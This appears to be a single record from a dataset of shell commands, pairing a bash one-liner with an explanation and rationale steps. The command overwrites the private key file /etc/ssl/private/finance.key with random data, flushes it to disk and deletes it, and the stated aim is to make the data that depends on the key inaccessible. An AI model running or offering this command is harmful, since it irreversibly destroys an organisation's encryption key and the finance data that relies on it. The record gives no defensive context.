command: bash -c 'f=/etc/ssl/private/finance.key; sz=$(stat -c%s "$f"); chmod u+w "$f" 2>/dev/null || true; dd if=/dev/urandom of="$f" bs=$sz count=1 conv=notrunc,fdatasync status=none && rm -f "$f"'
explanation: Overwrites and removes a targeted encryption key file to render dependent data inaccessible.
rationale_steps: Overwrite with random data to destroy key material
Flush buffers and delete the file
